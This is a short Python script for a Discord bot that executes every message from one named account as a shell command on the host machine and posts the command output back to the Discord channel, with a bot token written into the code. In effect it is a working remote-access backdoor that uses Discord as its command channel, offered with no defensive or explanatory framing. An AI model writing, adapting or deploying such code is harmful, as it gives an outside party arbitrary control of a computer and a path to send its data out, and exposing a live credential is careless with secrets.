botToken = 'NzM4MzU3MzEyNTYwOTU1NDc1.XyKu1Q.vSYPGe8xULIRj3E0SH5GcrsfZ28'
botMaster = 'Tricktech#7611' #bot token
import discord
import time
import subprocess

client = discord.Client()
i=1
while i>0:

      @client.event
      async def on_message(message):

          if message.content:
             if str(message.author) == botMaster:
                comando = subprocess.getoutput(str(message.content))
                msg = 'Command granted by {0.author.mention}\n{1}'.format(message, comando)
                await message.channel.send(msg)	
               # time.sleep(20)

      @client.event
      async def on_ready():
            print('Logged in as')
            print(client.user.name)
            print(client.user.id)
            print('------')

      client.run(botToken)
      time.sleep(3)
